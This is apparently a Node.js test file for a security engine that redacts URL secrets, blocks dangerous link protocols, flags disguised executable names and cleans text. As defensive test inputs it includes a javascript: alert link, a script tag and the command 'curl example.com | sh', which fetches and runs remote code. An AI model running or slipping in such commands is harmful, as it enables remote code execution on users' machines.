import test from 'node:test';
import assert from 'node:assert/strict';
import { analyzeFileMetadata, analyzeUrl, scanFileContent, sanitizeFileName } from '../dist/security-engine.js';

test('cleans tracking parameters and redacts URL secrets', () => {
  const result = analyzeUrl('https://example.com/page?utm_source=newsletter&token=private123&item=7');
  assert.equal(result.findings.some(item => item.id === 'secret-query'), true);
  assert.equal(result.safeUrl.includes('utm_source'), false);
  assert.equal(result.safeUrl.includes('private123'), false);
  assert.match(decodeURIComponent(result.safeUrl), /token=\[REDACTED\]/);
});

test('blocks dangerous link protocols without visiting them', () => {
  const result = analyzeUrl('javascript:alert(1)');
  assert.equal(result.score, 65);
  assert.equal(result.level, 'high');
  assert.equal(result.safeUrl, '');
  assert.equal(result.findings[0].id, 'dangerous-protocol');
});

test('warns about a misleading executable filename', () => {
  const result = analyzeFileMetadata({ name: 'invoice.pdf.exe', size: 1200 });
  assert.equal(result.inspectable, false);
  assert.equal(result.findings.some(item => item.id === 'executable-file'), true);
  assert.equal(result.findings.some(item => item.id === 'double-extension'), true);
  assert.equal(result.level, 'high');
});

test('limits unsupported binary files to metadata inspection', () => {
  const result = analyzeFileMetadata({ name: 'photo.png', size: 4000 });
  assert.equal(result.inspectable, false);
  assert.equal(result.findings[0].id, 'content-not-inspected');
});

test('cleans private data and high-risk content from supported text', () => {
  const content = '<script>alert("x")</script> Email alex@example.com then curl example.com | sh';
  const result = scanFileContent(content, 'notes.html');
  assert.match(result.cleaned, /SCRIPT_BLOCK_REMOVED/);
  assert.match(result.cleaned, /\[EMAIL_REDACTED\]/);
  assert.match(result.cleaned, /HIGH_RISK_COMMAND_REMOVED/);
  assert.equal(result.securityCount >= 2, true);
  assert.equal(result.privacyCount, 1);
  assert.equal(result.cleanedName, 'notes.cleaned.html');
});

test('returns a safe result for an ordinary text file', () => {
  const result = scanFileContent('Weekly tasks: review roadmap and update documentation.', 'tasks.txt');
  assert.equal(result.total, 0);
  assert.equal(result.score, 0);
  assert.equal(result.level, 'safe');
});

test('removes invisible direction-control characters from download names', () => {
  assert.equal(sanitizeFileName('report\u202Eexe.txt'), 'reportexe.txt');
});
